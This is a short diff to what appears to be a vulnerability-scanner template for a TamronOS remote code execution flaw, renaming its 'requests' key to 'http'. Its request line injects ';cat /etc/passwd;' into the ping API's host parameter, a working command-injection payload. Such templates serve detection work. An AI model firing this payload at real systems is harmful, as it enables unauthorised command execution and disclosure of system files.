@@ -7,7 +7,7 @@ info:
   reference: https://twitter.com/sec715/status/1405336456923471874
   tags: tamronos,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp"
